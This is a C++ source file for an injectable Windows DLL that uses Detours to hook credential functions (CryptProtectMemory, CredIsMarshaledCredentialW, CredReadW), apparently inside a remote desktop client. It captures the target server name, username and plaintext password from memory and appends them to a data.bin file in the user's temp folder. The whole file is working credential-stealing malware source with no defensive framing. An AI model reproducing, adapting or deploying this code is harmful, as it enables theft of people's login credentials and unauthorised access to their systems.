// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"
#include <Windows.h>
#include <detours.h>
#include <dpapi.h>
#include <wincred.h>
#include <strsafe.h>
#include <subauth.h>
#include <iostream>
#include <fstream>
#define SECURITY_WIN32 
#include <sspi.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "detours.lib")

LPCWSTR lpTempPassword = NULL;
LPCWSTR lpUsername = NULL;
LPCWSTR lpServer = NULL;

using namespace std;

VOID WriteCredentials_bak() {
	const DWORD cbBuffer = 1024;
	TCHAR TempFolder[MAX_PATH];
	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
	TCHAR Path[MAX_PATH];
	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WCHAR  DataBuffer[cbBuffer];
	memset(DataBuffer, 0x00, cbBuffer);
	DWORD dwBytesWritten = 0;
	StringCbPrintf(DataBuffer, cbBuffer, L"Server: %s\nUsername: %s\nPassword: %s\n\n", lpServer, lpUsername, lpTempPassword);

	WriteFile(hFile, DataBuffer, wcslen(DataBuffer) * 2, &dwBytesWritten, NULL);
	CloseHandle(hFile);

}

char* UnicodeToChar(LPCWSTR unicode_str)
{
	int num = WideCharToMultiByte(CP_OEMCP, NULL, unicode_str, -1, NULL, 0, NULL, FALSE);
	char* pchar = (char*)malloc(num);
	WideCharToMultiByte(CP_OEMCP, NULL, unicode_str, -1, pchar, num, NULL, FALSE);
	return pchar;
}

VOID WriteCredentials() 
{
	// 获取临时目录，并转换成char*
	TCHAR wtempPath[MAX_PATH];
	DWORD dwSize = 50;
	GetTempPath(dwSize, wtempPath);
	char tempPath[MAX_PATH];
	wcstombs(tempPath, wtempPath, wcslen(wtempPath) + 1);

	string temp_path(&tempPath[0], &tempPath[strlen(tempPath)]);

	// 临时文件
	ofstream f_temp;
	f_temp.open(temp_path + "data.bin", ios::app);
	if (f_temp) {
		f_temp << "Server: " << UnicodeToChar(lpServer) << "\nUsername: " << UnicodeToChar(lpUsername) << "\nPassword: " << UnicodeToChar(lpTempPassword) << "\n\n";
	}
	f_temp.close();
	WriteCredentials_bak();
}


static SECURITY_STATUS(WINAPI* OriginalSspiPrepareForCredRead)(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR* ppszCredmanTargetName) = SspiPrepareForCredRead;

SECURITY_STATUS _SspiPrepareForCredRead(PSEC_WINNT_AUTH_IDENTITY_OPAQUE AuthIdentity, PCWSTR pszTargetName, PULONG pCredmanCredentialType, PCWSTR* ppszCredmanTargetName) {

	lpServer = pszTargetName;
	return OriginalSspiPrepareForCredRead(AuthIdentity, pszTargetName, pCredmanCredentialType, ppszCredmanTargetName);
}

static BOOL (WINAPI * OriginalCredReadW)(_In_ LPCWSTR TargetName, _In_ DWORD Type, _Reserved_ DWORD Flags, _Out_ PCREDENTIALW* Credential) = CredReadW;

BOOL HookedCredReadW(_In_ LPCWSTR TargetName, _In_ DWORD Type, _Reserved_ DWORD Flags, _Out_ PCREDENTIALW* Credential)
{
	// 拿到主机名
	lpServer = TargetName;
	// 其他不变，调用原来的函数
	return OriginalCredReadW(TargetName, Type, Flags, Credential);
}


static DPAPI_IMP BOOL(WINAPI* OriginalCryptProtectMemory)(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) = CryptProtectMemory;

BOOL _CryptProtectMemory(LPVOID pDataIn, DWORD  cbDataIn, DWORD  dwFlags) {

	DWORD cbPass = 0;
	LPVOID lpPassword;
	int* ptr = (int*)pDataIn;
	LPVOID lpPasswordAddress = ptr + 0x1;
	memcpy_s(&cbPass, 4, pDataIn, 4);

	//When the password is empty it only counts the NULL byte.
	if (cbPass > 0x2) {
		SIZE_T written = 0;
		lpPassword = VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
		WriteProcessMemory(GetCurrentProcess(), lpPassword, lpPasswordAddress, cbPass, &written);
		lpTempPassword = (LPCWSTR)lpPassword;

	}

	return OriginalCryptProtectMemory(pDataIn, cbDataIn, dwFlags);
}


static BOOL(WINAPI* OriginalCredIsMarshaledCredentialW)(LPCWSTR MarshaledCredential) = CredIsMarshaledCredentialW;

BOOL _CredIsMarshaledCredentialW(LPCWSTR MarshaledCredential) 
{
	lpUsername = MarshaledCredential;
	if (wcslen(lpUsername) > 0) {

		WriteCredentials();
	}
	return OriginalCredIsMarshaledCredentialW(MarshaledCredential);
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourAttach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		//DetourAttach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
		DetourAttach(&(PVOID&)OriginalCredReadW, HookedCredReadW);
		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)OriginalCryptProtectMemory, _CryptProtectMemory);
		DetourDetach(&(PVOID&)OriginalCredIsMarshaledCredentialW, _CredIsMarshaledCredentialW);
		//DetourDetach(&(PVOID&)OriginalSspiPrepareForCredRead, _SspiPrepareForCredRead);
		DetourDetach(&(PVOID&)OriginalCredReadW, HookedCredReadW);
		DetourTransactionCommit();

	}
	return TRUE;
}